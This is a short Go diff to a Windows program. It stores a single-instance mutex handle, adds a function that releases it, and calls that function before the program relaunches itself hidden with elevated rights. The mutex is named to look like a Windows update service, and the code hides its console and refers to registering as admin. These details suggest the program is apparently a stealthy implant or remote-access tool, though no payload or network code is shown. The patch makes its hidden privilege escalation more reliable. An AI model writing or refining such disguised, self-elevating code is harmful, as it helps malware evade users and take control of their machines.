@@ -593,6 +593,8 @@ func now() string { return time.Now().UTC().Format(time.RFC3339) }
 // SINGLE INSTANCE + HIDE CONSOLE
 // ================================================================
 
+var singleInstanceMutex windows.Handle
+
 func createSingleInstance() bool {
 	name, _ := windows.UTF16PtrFromString("Global\\WinUpdateSvcMtx")
 	h, err := windows.CreateMutex(nil, false, name)
@@ -603,7 +605,16 @@ func createSingleInstance() bool {
 		windows.CloseHandle(h)
 		return false
 	}
+	singleInstanceMutex = h
 	return true
+}
+
+func releaseSingleInstance() {
+	if singleInstanceMutex != 0 {
+		windows.ReleaseMutex(singleInstanceMutex)
+		windows.CloseHandle(singleInstanceMutex)
+		singleInstanceMutex = 0
+	}
 }
 
 func hideConsole() {
@@ -1670,8 +1681,9 @@ func elevate() string {
 		0, // SW_HIDE
 	)
 	if ret > 32 {
-		// Exit this (non-admin) process so the new elevated instance can
-		// acquire the single-instance mutex and register as admin.
+		// Release the single-instance mutex so the elevated process can
+		// acquire it, then exit this (non-admin) process.
+		releaseSingleInstance()
 		go func() {
 			time.Sleep(2 * time.Second)
 			os.Exit(0)
